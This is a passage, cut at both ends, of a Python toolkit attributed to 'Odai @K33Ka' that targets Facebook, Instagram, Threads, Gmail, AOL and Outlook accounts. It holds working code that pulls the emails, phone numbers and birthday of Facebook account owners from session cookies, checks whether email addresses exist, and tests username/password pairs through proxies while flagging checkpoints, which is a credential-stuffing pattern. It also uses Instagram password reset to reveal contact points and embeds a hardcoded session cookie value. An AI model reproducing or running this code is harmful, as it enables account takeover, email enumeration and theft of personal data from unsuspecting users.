            cookies = {'datr': datr, 'ps_l': '1', 'ps_n': '1', 'sb': sb, 'dpr': '1.25', 'wd': wd, 'c_user': c_user, 'fr': '1iq1a4QIVodVmxG7I.AWeuwjn9SyIbptY2XAYrBLfXgmkYwZPSmF6Hr2yGo9V2aRU-ysY.Bptqbr..AAA.0.0.Bptqbr.AWekh9RBJfyu_fQVOsBrC3euJAk', 'xs': xs, 'presence': 'C%7B%22t3%22%3A%5B%5D%2C%22utc3%22%3A1773578123492%2C%22v%22%3A1%7D'}
            headers = {'accept': '*/*', 'accept-language': 'en-US,en;q=0.9,ar;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://accountscenter.facebook.com', 'priority': 'u=1, i', 'referer': 'https://accountscenter.facebook.com/profiles', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"', 'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Google Chrome";v="145.0.7632.160", "Chromium";v="145.0.7632.160"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"19.0.0"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36', 'x-asbd-id': '359341', 'x-fb-friendly-name': 'FXAccountsCenterPersonalCentralIdentityDialogV2Query', 'x-fb-lsd': lsd}
            data = {'av': c_user, '__user': c_user, '__a': '1', '__req': 'l', '__hs': '20527.HYP:accounts_center_pkg.2.1...0', 'dpr': '1', '__ccg': 'GOOD', '__rev': '1035205964', '__s': 'txvfss:84i8p9:hr7nlk', '__hsi': '7617460095362994183', '__sjsp': 'gpRi1F1v96gbIfMugGMEY4s0KUgx4aBIEUk0oSbyU1n8', '__comet_req': '5', 'fb_dtsg': fb_dtsg, 'jazoest': '25453', 'lsd': lsd, '__spin_r': '1035205964', '__spin_b': 'trunk', '__spin_t': '1773578137', 'fb_api_caller_class': 'RelayModern', 'fb_api_req_friendly_name': 'FXAccountsCenterPersonalCentralIdentityDialogV2Query', 'server_timestamps': 'true', 'variables': '{"identity_id":"'+c_user+'","interface":"FB_WEB","platform":"FACEBOOK","scale":1}', 'doc_id': '24467941749567966'}
            response = requests.post('https://accountscenter.facebook.com/api/graphql/',cookies=cookies,headers=headers,data=data).text
            if 'Log in to continue' in response:return {"status": "invaild", "msg": "You Need To Login, Check Your Cookies" , "Dev": "Odai @K33Ka"}
            js = json.loads(response.replace("for (;;);",""))
            node = js["data"]["fxcal_settings"]["node"]
            contacts = node["all_contact_points"]
            if contacts: 
                result = {"emails": [],"phones": [], "Dev": "Odai @K33Ka"}
                for c in contacts:
                    if c["contact_point_type"] == "EMAIL":result["emails"].append(c["normalized_contact_point"])
                    if c["contact_point_type"] == "PHONE_NUMBER":result["phones"].append(c["normalized_contact_point"])
            else:result = {"status": "false","msg": "No data","Dev": "Odai @K33Ka"}
            return result
        @staticmethod
        def birthday(cookies_input):
            if isinstance(cookies_input, str):
                cookies_dict = {}
                for item in cookies_input.split(";"):
                    if "=" in item:
                        key, value = item.split("=", 1)
                        cookies_dict[key.strip()] = value.strip()
            elif isinstance(cookies_input, dict):cookies_dict = cookies_input.copy()
            else:
                print("Invalid cookies format")
                return
            datr = cookies_dict.get("datr")
            sb = cookies_dict.get("sb")
            wd = cookies_dict.get("wd")
            c_user = cookies_dict.get("c_user")
            xs = cookies_dict.get("xs")
            session = requests.Session()
            session.cookies.update(cookies_dict)
            headers = {"user-agent": "Mozilla/5.0"}
            url = "https://accountscenter.facebook.com/"
            res = session.get(url, headers=headers).text
            fb_dtsg_match = re.search(r'"DTSGInitialData",\[\],{"token":"(.*?)"}', res)
            lsd_match = re.search(r'"LSD",\[\],{"token":"(.*?)"}', res)
            fb_dtsg = fb_dtsg_match.group(1) if fb_dtsg_match else None
            lsd = lsd_match.group(1) if lsd_match else None
            cookies = {'datr': datr, 'ps_l': '1', 'ps_n': '1', 'sb': sb, 'dpr': '1.25', 'wd': wd, 'c_user': c_user, 'fr': '1iq1a4QIVodVmxG7I.AWeuwjn9SyIbptY2XAYrBLfXgmkYwZPSmF6Hr2yGo9V2aRU-ysY.Bptqbr..AAA.0.0.Bptqbr.AWekh9RBJfyu_fQVOsBrC3euJAk', 'xs': xs, 'presence': 'C%7B%22t3%22%3A%5B%5D%2C%22utc3%22%3A1773578123492%2C%22v%22%3A1%7D'}
            headers = {'accept': '*/*', 'accept-language': 'en-US,en;q=0.9,ar;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://accountscenter.facebook.com', 'priority': 'u=1, i', 'referer': 'https://accountscenter.facebook.com/profiles', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"', 'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Google Chrome";v="145.0.7632.160", "Chromium";v="145.0.7632.160"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"19.0.0"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36', 'x-asbd-id': '359341', 'x-fb-friendly-name': 'FXAccountsCenterBirthdayRootQuery', 'x-fb-lsd': lsd}
            data = {'av': c_user, '__user': c_user, '__a': '1', '__req': 'l', '__hs': '20527.HYP:accounts_center_pkg.2.1...0', 'dpr': '1', '__ccg': 'GOOD', '__rev': '1035205964', '__s': 'txvfss:84i8p9:hr7nlk', '__hsi': '7617460095362994183', '__sjsp': 'gpRi1F1v96gbIfMugGMEY4s0KUgx4aBIEUk0oSbyU1n8', '__comet_req': '5', 'fb_dtsg': fb_dtsg, 'jazoest': '25453', 'lsd': lsd, '__spin_r': '1035205964', '__spin_b': 'trunk', '__spin_t': '1773578137', 'fb_api_caller_class': 'RelayModern', 'fb_api_req_friendly_name': 'FXAccountsCenterBirthdayRootQuery', 'server_timestamps': 'true', 'variables': '{"interface":"FB_WEB","node":"BIRTHDAY"}', 'doc_id': '26426848043589913'}
            response = requests.post('https://accountscenter.facebook.com/api/graphql/',cookies=cookies,headers=headers,data=data).text
            if 'Log in to continue' in response:return {"status": "invaild", "msg": "You Need To Login, Check Your Cookies" , "Dev": "Odai @K33Ka"}
            response = response.replace("for (;;);","")
            js = json.loads(response)
            birthday = js["data"]["fxcal_settings"]["node"]["birthday"]
            if birthday:return {"status": "true","birthday": birthday,"Dev": "Odai @K33Ka"}
            else:return {"status": "invaild", "msg": "Can't Extract The Birthday, Check Your Cookies or Account" , "Dev": "Odai @K33Ka"}
    class tools:
        class apps:
            @staticmethod
            def get_linked_apps(cookies_input):
                session = requests.Session()
                if isinstance(cookies_input, dict):coki = cookies_input
                elif isinstance(cookies_input, str):
                    coki = {}
                    cleaned = ';'.join([p.strip() for p in cookies_input.split(';') if p.strip()])
                    for part in cleaned.split(';'):
                        if '=' not in part:continue
                        key, val = part.split('=', 1)
                        coki[key.strip()] = val.strip()
                else:return {"status": "false","msg": "error in cookies format", "Dev": "Odai @K33Ka"}
                ua = 'NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 9; SH-03J) AppleWebKit/537.36 (KHTML, like Gecko) Safari/420+'
                headers = {'user-agent': ua}
                try:rr1 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=active', cookies=coki, headers=headers, timeout=12).text
                except:rr1 = ""
                try:rr2 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=inactive', cookies=coki, headers=headers, timeout=12).text
                except:rr2 = ""
                output = []
                if 'tidak memiliki aplikasi' in rr1.lower() or 'no active apps' in rr1.lower():output.append("No active apps")
                else:
                    apps_active = re.findall(r'data-testid="app_info_text">([^<]+)</span>', rr1)
                    dates_active = re.findall(r'(?:تمت الإضافة في|Added on|Ditambahkan pada|Ajouté le|Dodano dnia)\s*([^<]+)</p>', rr1)
                    if not apps_active:output.append("No active apps found")
                    else:
                        for i, app in enumerate(apps_active):
                            app_clean = app.strip()
                            try:date_clean = dates_active[i].strip()
                            except IndexError:date_clean = "غير معروف"
                            output.append(f"[{i+1}] {app_clean} - {date_clean}")
                lower_rr2 = rr2.lower()
                if 'kedaluwarsa' in lower_rr2 and 'tidak memiliki' in lower_rr2:output.append("No inactive/expired apps")
                else:
                    apps_inactive = re.findall(r'data-testid="app_info_text">([^<]+)</span>', rr2)
                    dates_raw = re.findall(r'<p[^>]*>(?:Kedaluwarsa pada|انتهت الصلاحية في|منتهية الصلاحية في|Expired on)[^<]*</p>', rr2)
                    dates_inactive = [re.sub(r'<[^>]+>', '', d).strip() for d in dates_raw]
                    if not apps_inactive:output.append("No inactive/expired apps found")
                    else:
                        for i, app in enumerate(apps_inactive):
                            app_clean = app.strip()
                            try:date_clean = dates_inactive[i].strip()
                            except IndexError:date_clean = "غير معروف"
                            output.append(f"[{i+1}] {app_clean} - {date_clean}")
                if not output:output.append("لا توجد بيانات متاحة")
                return output
class checkems:
    @staticmethod
    def gmail(email, proxies=None):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        proxy = proxies if proxies else None

        try:
            if "@" in email:
                email = email.split("@")[0]

            TL = None
            __Host_GAPS = None
            base_url = 'https://accounts.google.com/_/signup'
            headers = {
                'user-agent': generate_user_agent(),
                'google-accounts-xsrf': '1',
            }

            url = base_url + '/validatepersonaldetails'
            params = {
                'hl': "ar",
                '_reqid': "74404",
                'rt': "j"
            }
            payload = {
                'f.req': "[\"AEThLlymT9V_0eW9Zw42mUXBqA3s9U9ljzwK7Jia8M4qy_5H3vwDL4GhSJXkUXTnPL_roS69KYSkaVJLdkmOC6bPDO0jy5qaBZR0nGnsWOb1bhxEY_YOrhedYnF3CldZzhireOeUd-vT8WbFd7SXxfhuWiGNtuPBrMKSLuMomStQkZieaIHlfdka8G45OmseoCfbsvWmoc7U\",\"L7N\",\"ToPython\",\"L7N\",\"ToPython\",0,0,null,null,null,0,null,1,[],1]",
                'deviceinfo': "[null,null,null,null,null,\"IQ\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,1,1,2]",
            }

            __Host_GAPS = ''.join(secrets.choice("qwertyuiopasdfghjklzxcvbnm") for _ in range(secrets.randbelow(16) + 15))
            cookies = {'__Host-GAPS': __Host_GAPS}

            response = requests.post(url, cookies=cookies, params=params, data=payload, headers=headers, timeout=10, proxies = proxy.build(proxy), verify=False)

            if response.status_code != 200:
                return {"status": "error", "msg": "bad response step 1", "Dev": "Odai @K33Ka"}

            if '",null,"' not in response.text:
                return {"status": "error", "msg": "failed to extract TL", "Dev": "Odai @K33Ka"}

            TL = str(response.text).split('",null,"')[1].split('"')[0]
            __Host_GAPS = response.cookies.get_dict().get('__Host-GAPS')

            url = base_url + '/usernameavailability'
            cookies = {'__Host-GAPS': __Host_GAPS}
            params = {'TL': TL}

            data = {
                'continue': 'https://mail.google.com/mail/u/0/',
                'ddm': '0',
                'flowEntry': 'SignUp',
                'service': 'mail',
                'theme': 'mn',
                'f.req': f'["TL:{TL}","{email}",0,0,1,null,0,5167]',
                'azt': 'AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig:1712322460888',
                'cookiesDisabled': 'false',
                'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
                'gmscoreversion': 'undefined',
                'flowName': 'GlifWebSignIn'
            }

            response = requests.post(url, params=params, cookies=cookies, headers=headers, data=data, timeout=10, proxies = proxy.build(proxies), verify=False)

            if response.status_code == 200:
                if '"gf.uar",1' in response.text:
                    return {"status": "available", "email": email, "Dev": "Odai @K33Ka"}
                if '"gf.uar",2' in response.text:return {"status": "taken", "email": email, "Dev": "Odai @K33Ka"}
                else:return {"status": "unknown", "email": email, "Dev": "Odai @K33Ka"}
            else:
                return {"status": "error", "msg": "bad response step 2", "Dev": "Odai @K33Ka"}

        except Exception as e:
            return {"status": "error", "error": str(e)}

    @staticmethod
    def aol(email, proxies=None):
        proxy = proxies if proxies else None
        if '@' in email:aoll = email.split('@')[0]
        else:aoll = email
        s = requests.Session()
        try:
            first_names = ["Liam", "Olivia", "Noah", "Emma", "Ava", "Sophia", "James", "Isabella", "Gabriella", "Mia"]
            last_names = ["Johnson", "Brown", "Davis", "Miller", "Wilson", "Taylor", "Moore", "Collins", "Anderson", "Thomas"]

            first_name = random.choice(first_names)
            last_name = random.choice(last_names)

            chars = string.ascii_letters + string.digits + "!@#$%^&*()-_=+"
            password = ''.join(random.choice(chars) for _ in range(12))

            agent = generate_user_agent()

            req = s.get(
                "https://login.aol.com/account/create",
                headers={'User-Agent': agent},
                proxies = proxy.build(proxy)
            )

            soup = BeautifulSoup(req.text, "html.parser")

            crumb = soup.find("input", {"name": "crumb"}).get("value", "")
            acrumb = soup.find("input", {"name": "acrumb"}).get("value", "")
            sessionIndex = soup.find("input", {"name": "sessionIndex"}).get("value", "")
            asId = soup.find("input", {"name": "asId"}).get("value", "")

            cook = req.cookies.get_dict()

            payload = {
                'specId': "yidregsimplified",
                'context': "REGISTRATION",
                'crumb': crumb,
                'acrumb': acrumb,
                'sessionIndex': sessionIndex,
                'tos0': "oath_freereg|us|en-US",
                'asId': asId,
                'firstName': first_name,
                'lastName': last_name,
                'userid-domain': "yahoo",
                'userId': aoll,
                'password': password,
                'mm': str(random.randint(1, 12)),
                'dd': str(random.randint(1, 28)),
                'yyyy': random.randint(1990, 2002),
                'signup': ""
            }

            headers = {
                'User-Agent': agent,
                'sec-ch-ua-platform': "\"Android\"",
                'x-requested-with': "XMLHttpRequest",
                'sec-ch-ua-mobile': "?1",
                'origin': "https://login.aol.com",
                'referer': "https://login.aol.com/account/create",
                'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"
            }

            res = s.post(
                "https://login.aol.com/account/module/create?validateField=userId",
                data=payload,
                headers=headers,
                cookies=cook,
                proxies = proxy.build(proxy)
            ).text

            if '{"errors":[]}' in res:
                username, domain = email.split('@') if '@' in email else (aoll, "unknown")
                return {
                    "status": "available",
                    "email": email,
                    "Dev": "Odai @K33Ka"
                }
            
            else:
                return {
                    "status": "taken",
                   "email": email,
                    "Dev": "Odai @K33Ka"
                }

        except Exception as e:
            return {
                "status": "error",
                "error": str(e),
                "Dev": "Odai @K33Ka"
            }
    @staticmethod
    def outlook(email, proxies=None):
        proxy = proxies if proxies else None
        if not hasattr(checkems.outlook, "mc"):
            checkems.outlook.mc = None
            checkems.outlook.ca = None
        def get_token():
            try:
                r = requests.get(
                    'https://signup.live.com/signup',
                    headers={'accept': 'text/html', 'user-agent': generate_user_agent()},
                    timeout=10,
                    proxies = proxy.build(proxy)
                )
                canary = str.encode(r.text.split('"apiCanary":"')[1].split('"')[0]).decode("unicode_escape")
                mc = r.cookies.get('amsc')
                if not mc:
                    return None, None
                r = requests.post(
                    'https://signup.live.com/API/EvaluateExperimentAssignments',
                    cookies={'amsc': mc},
                    headers={
                        'accept': 'application/json',
                        'canary': canary,
                        'content-type': 'application/json',
                        'origin': 'https://signup.live.com',
                        'referer': 'https://signup.live.com/',
                        'user-agent': generate_user_agent()
                    },
                    json={
                        'clientExperiments': [{
                            'parallax': 'enableplaintextforsignupexperiment',
                            'control': 'enableplaintextforsignupexperiment_control',
                            'treatments': ['enableplaintextforsignupexperiment_treatment'],
                        }]
                    },
                    timeout=10,
                    proxies = proxy.build(proxy)
                ).json()

                ca = r.get('apiCanary')
                if ca:
                    return mc, ca
            except:
                pass
            return None, None

        if not checkems.outlook.mc or not checkems.outlook.ca:
            checkems.outlook.mc, checkems.outlook.ca = get_token()
            if not checkems.outlook.mc or not checkems.outlook.ca:
                return {"status": "token failed"}

        try:
            r = requests.post(
                'https://signup.live.com/API/CheckAvailableSigninNames',
                params={
                    'mkt': 'AR-AR',
                    'lic': '1',
                    'uaid': str(uuid.uuid4())
                },
                cookies={
                    'mkt': 'ar-YE',
                    'MicrosoftApplicationsTelemetryDeviceId': str(uuid.uuid4()),
                    'MUID': token_hex(16),
                    'amsc': checkems.outlook.mc
                },
                headers={
                    'accept': 'application/json',
                    'canary': checkems.outlook.ca,
                    'content-type': 'application/json',
                    'origin': 'https://signup.live.com',
                    'referer': 'https://signup.live.com/signup',
                    'user-agent': generate_user_agent(),
                    'x-ms-apiversion': '2'
                },
                json={
                    'signInName': email,
                    'includeSuggestions': True
                },
                timeout=10,
                proxies = proxy.build(proxy)
            ).text

            if '"isAvailable":true' in r:
                return {"status": "available", "email": email, "Dev": "Odai @K33Ka"}
            if '"isAvailable":false' in r:
                return {"status": "taken", "email": email, "Dev": "Odai @K33Ka"}
            checkems.outlook.mc, checkems.outlook.ca = get_token()
            return {"status": "error", "response": "unknown", "Dev": "Odai @K33Ka"}
        except Exception as e:
            checkems.outlook.mc, checkems.outlook.ca = get_token()
            return {"status": "error", "error": str(e), "Dev": "Odai @K33Ka"}
class threads:
    @staticmethod
    def login(user, password, proxies=None):
        Dev = "Odai @K33Ka"
        if not user or not password:return {"status": "invalid input","user": user,"password": password,"Dev": Dev}
        payload = {'can_threads_signup_with_ig': "false",'enc_password': f"#PWD_BROWSER:0:{str(int(time.time()))}:{password}",'optIntoOneTap': "false",'queryParams': "{}",'stopDeletionNonce': "","textAppStopDeletionToken": "","username": user}
        headers = {'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",'x-instagram-ajax': "0",'x-ig-app-id': "1412234116260832",'x-asbd-id': "359341",'x-bloks-version-id': "86eaac606b7c5e9b45f4357f86082d05eace8411e43d3f754d885bf54a759a71",'sec-ch-prefers-color-scheme': "light",'sec-ch-ua-platform-version': "\"16.0.0\"",'origin': "https://www.threads.com",'sec-fetch-site': "same-origin",'sec-fetch-mode': "cors",'sec-fetch-dest': "empty",'referer': "https://www.threads.com/login/",'accept-language': "en-US"}
        try:
            client = httpx.Client(http2=True, proxies = proxy.build(proxies), timeout=15)
            pre = client.get("https://www.threads.com/login/")
            csrftoken = client.cookies.get("csrftoken", "")
            headers['x-csrftoken'] = csrftoken
            response = client.post("https://www.threads.com/api/v1/web/accounts/login/ajax/", data=payload, headers=headers)
            text = response.text
            if '"authenticated":true' in text:return {"status": "success","user": user,"password": password,"cookies": client.cookies.get_dict(),"Dev": Dev}
            elif '"error_type":"UserInvalidCredentials"' in text or '"user":true,"authenticated":false' in text:return {"status": "bad password","user": user,"password": password,"Dev": Dev}
            elif 'checkpoint_required' in text or 'checkpoint_url' in text or 'challenge' in text or 'two_factor' in text:
                return {"status": "checkpoint","user": user,"password": password,"Dev": Dev}
            elif '"user":true' in text and '"authenticated":false' in text:return {"status": "bad password","user": user,"password": password,"Dev": Dev}
            elif '"status":"fail"' in text and 'CSRF' in text:return {"status": "csrf failed","user": user,"password": password,"Dev": Dev}
            else:return {"status": "unknown response","user": user,"password": password,"Dev": Dev}
        except Exception as e:return {"status": "error","error": str(e),"user": user,"password": password,"Dev": Dev}
    @staticmethod
    def info(username, proxies=None):
        Dev = "Odai @K33Ka"
        if not username:return {"status": "invalid input","Dev": Dev}
        try:
            cookies = {'csrftoken': '','ig_did': '','dpr': '2.737499952316284','mid': ''}
            headers = {'authority': 'www.threads.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9,ar;q=0.8','cache-control': 'max-age=0','dpr': '2.737499952316284','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"','sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"','sec-ch-ua-mobile': '?1','sec-ch-ua-model': '"2201117PG"','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"13.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36','viewport-width': '980'}
            url = f"https://www.threads.com/@{username}"
            res = requests.get(url, cookies=cookies, headers=headers, proxies = proxy.build(proxies))
            html = res.text
            if 'Sorry, this page isn\'t available' in html or res.status_code == 404:return {"status": "user not found","user": username,"Dev": Dev}
            soup = BeautifulSoup(html, 'html.parser')
            profile_data = {}
            title_tag = soup.find('title')
            if title_tag:
                title_text = title_tag.get_text()
                match = re.search(r'\(@([^)]+)\)', title_text)
                if match: profile_data['username'] = match.group(1)
                name_match = re.match(r'^([^(]+)', title_text)
                if name_match: profile_data['name'] = name_match.group(1).strip()
            meta_desc = soup.find('meta', attrs={'name': 'description'})
            if meta_desc and meta_desc.get('content'):
                desc = meta_desc['content']
                followers_match = re.search(r'([\d\.]+[KMB]?)\s*Followers', desc, re.IGNORECASE)
                threads_match = re.search(r'([\d\.]+[KMB]?)\s*Threads', desc, re.IGNORECASE)
                if followers_match: profile_data['followers'] = followers_match.group(1)
                if threads_match: profile_data['threads'] = threads_match.group(1)
                bio_part = desc.split('•')[-1].strip()
                if bio_part: profile_data['bio'] = bio_part
            og_image = soup.find('meta', attrs={'property': 'og:image'})
            if og_image and og_image.get('content'):
                profile_data['avatar'] = og_image['content']
            posts = []
            containers = soup.find_all('div', attrs={'data-pagelet': re.compile(r'threads_profile_posts_timeline')})
            for container in containers:
                spans = container.find_all('span', class_=re.compile(r'x1lliihq'))
                for span in spans:
                    text = span.get_text(strip=True)
                    if text and len(text) > 20:
                        link_tag = container.find('a', href=re.compile(r'l\.threads\.com'))
                        link = link_tag['href'] if link_tag else None
                        time_tag = container.find('time')
                        time_txt = time_tag.get_text(strip=True) if time_tag else None
                        posts.append({'text': text,'link': link,'time': time_txt})
                        break
            profile_data['posts'] = posts[:10]
            scripts = soup.find_all('script', type='application/json')
            for script in scripts:
                if script.string:
                    try:
                        data = json.loads(script.string)
                        if isinstance(data, dict) and 'user' in data:
                            user = data['user']
                            if 'username' in user: profile_data['username'] = user['username']
                            if 'full_name' in user: profile_data['name'] = user['full_name']
                            if 'follower_count' in user: profile_data['followers'] = str(user['follower_count'])
                            if 'biography' in user: profile_data['bio'] = user['biography']
                            if 'profile_pic_url' in user: profile_data['avatar'] = user['profile_pic_url']
                    except: pass
            return {"status": "success","user": username,"data": profile_data,"Dev": Dev}
        except Exception as e:
            return {"status": "error","error": str(e),"user": username,"Dev": Dev}
class instagram:
    @staticmethod
    def login(username, password, proxies=None):
        def instaagent():
            android_versions=[("29","10"),("30","11"),("31","12"),("32","12L"),("33","13"),("34","14")];devices=[("Xiaomi","Redmi","Redmi Note 8 Pro","begonia","mt6785","1080x2220","440"),("Xiaomi","Redmi","Redmi Note 10","mojito","sm6150","1080x2400","440"),("Xiaomi","POCO","POCO X3","surya","sm7150","1080x2400","440"),("samsung","Samsung","SM-A515F","a51","exynos9611","1080x2400","420"),("samsung","Samsung","SM-G991B","o1s","exynos2100","1080x2400","450"),("HUAWEI","Huawei","P30 Pro","VOG-L29","kirin980","1080x2340","440"),("OPPO","Oppo","CPH2065","reno4","sm7125","1080x2400","440")];locales=["en_US","ar_EG","ar_SA","fr_FR","es_ES"];ig_versions=["237.0.0.14.102","238.0.0.17.107","239.0.0.18.109","240.1.0.16.110"];android_api,android_release=random.choice(android_versions);brand,manufacturer,model,device,cpu,resolution,dpi=random.choice(devices)
            return f"Instagram {random.choice(ig_versions)} Android ({android_api}/{android_release}; {dpi}dpi; {resolution}; {manufacturer}; {model}; {device}; {cpu}; {random.choice(locales)}; {random.randint(300000000,399999999)})"
        try:
            headers={'User-Agent':instaagent(),'x-bloks-version-id':"8dab28e76d3286a104a7f1c9e0c632386603a488cf584c9b49161c2f5182fe07",'x-ig-app-id':"567067343352427",'priority':"u=3",'accept-language':"ar-EG, en-US"}
            data={'signed_body':f'SIGNATURE.{{"enc_password":"#PWD_INSTAGRAM:0:{int(time.time())}:{password}","username":"{username}","adid":"","guid":"{uuid4()}","device_id":"android-{str(uuid4())[:16]}","google_tokens":"[]","login_attempt_count":"0"}}'}
            r=requests.post("https://i.instagram.com/api/v1/accounts/login/",data=data,headers=headers,proxies = proxy.build(proxies));text=r.text
            try:js=r.json()
            except:js={}
            if '"authenticated":true' in text or 'logged_in_user' in text:return {"status":"success","user":username,"password":password,"Dev":"Odai @K33Ka"}
            error_type=js.get("error_type","")
            if error_type=="bad_password":return {"status":"bad password","user":username,"password":password,"Dev":"Odai @K33Ka"}
            elif error_type=="invalid_user":return {"status":"user not found","user":username,"password":password,"Dev":"Odai @K33Ka"}
            elif error_type in ["two_factor_required","challenge_required"]:return {"status":"checkpoint","user":username,"password":password,"Dev":"Odai @K33Ka"}
            elif error_type=="checkpoint_challenge_required":return {"status":"checkpoint","user":username,"password":password,"Dev":"Odai @K33Ka"}
            elif error_type=="missing_parameters":return {"status":"missing parameters","user":username,"password":password,"Dev":"Odai @K33Ka"}
            elif error_type=="unexpected_login_error":return {"status":"error login","user":username,"password":password,"Dev":"Odai @K33Ka"}
            else:return {"status":"unknown response","user":username,"password":password,"Dev":"Odai @K33Ka"}
        except Exception as e:return {"status":"error","error":str(e),"user":username,"password":password,"Dev":"Odai @K33Ka"}

    @staticmethod
    def rest(email, proxies=None):
        Dev = "Odai @K33Ka"
        if not email:
            return {"status": "invalid input","email": email,"Dev": Dev}
        try:
            headers = {"user-agent": generate_user_agent(),"x-ig-app-id": "936619743392459","x-requested-with": "XMLHttpRequest","x-instagram-ajax": "1032099486","x-csrftoken": "missing","x-asbd-id": "359341","origin": "https://www.instagram.com","referer": "https://www.instagram.com/accounts/password/reset/","accept-language": "en-US","priority": "u=1, i"}
            r = httpx.Client(http2=True, headers=headers, timeout=20, proxies = proxy.build(proxies)).post("https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",data={"email_or_username": email})
            try:
                response = r.json()
            except:
                return {"status": "bad response", "email": email,"Dev": Dev}
            contact = response.get('contact_point', 'not linked with e-mail')
            return {"status": "success","email": email,"contact": contact,"Dev": Dev}
        except Exception as e:
            return {"status": "error","error": str(e),"email": email,"Dev": Dev}
    @staticmethod
    def info_s(sessionid, proxies=None):
        import requests, json
        Dev = "Odai @K33Ka"
        if not sessionid:
            return {"status": "invalid input","sessionid": sessionid,"Dev": Dev}
        try:
            cookies = {'csrftoken': 'missing','mid': 'missing','datr': 'missing','ig_did': 'missing','wd': '988x872','dpr': '1.25','ps_l': '1','ps_n': '1','ds_user_id': '0','sessionid': sessionid,'rur': 'missing'}
            headers = {'accept': '*/*','accept-language': 'en-GB,en;q=0.9,ar-JO;q=0.8,ar;q=0.7,en-US;q=0.6','content-type': 'application/x-www-form-urlencoded','origin': 'https://accountscenter.instagram.com','priority': 'u=1, i','referer': 'https://accountscenter.instagram.com/?theme=dark&entry_point=app_settings','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"','sec-ch-ua-full-version-list': '"Chromium";v="146.0.7680.80", "Not-A.Brand";v="24.0.0.0", "Google Chrome";v="146.0.7680.80"','sec-ch-ua-mobile': '?0','sec-ch-ua-model': '""','sec-ch-ua-platform': '"Windows"','sec-ch-ua-platform-version': '"19.0.0"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36','x-asbd-id': '359341','x-fb-friendly-name': 'FXAccountsCenterProfilesPageV2Query','x-fb-lsd': 'missing'}
            data = {'av': '17841400324458181','__user': '0','__a': '1','__req': 'y','__hs': '20530.HYP:accounts_center_pkg.2.1...0','dpr': '1','__ccg': 'GOOD','__rev': '1035370989','__s': 'd4pb9a:20ccs1:b7dvzk','__hsi': '7618384905762253501','__dyn': '7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W099w8G1Dz81s8hwnU2lwv89k2C1Fwc60D82IzXwae4UaEW0Loco5G0zK1swa-0raazo7u0zEiwaG1LwTwNw4mwr86C1nw4xxW1ow4-w','__sjsp': 'glh2YQ5Q6ct6E4416moSVEgw6vyxwG5j5aa5tM355lO8k8k8J0hXo','__comet_req': '24','fb_dtsg': 'missing','jazoest': '26351','lsd': 'missing','__spin_r': '1035370989','__spin_b': 'trunk','__spin_t': '1773793461','fb_api_caller_class': 'RelayModern','fb_api_req_friendly_name': 'FXAccountsCenterProfilesPageV2Query','server_timestamps': 'true','variables': '{"device_id":"device_id_fetch_ig_did","flow":"IG_WEB_SETTINGS","interface":"IG_WEB","platform":"INSTAGRAM","scale":1}','doc_id': '25777809238584450'}
            r = requests.post('https://accountscenter.instagram.com/api/graphql/', cookies=cookies, headers=headers, data=data, proxies = proxy.build(proxies))
            text = r.text
            try:
                js = json.loads(text)
            except:
                return {"status": "bad response","Dev": Dev}
            try:
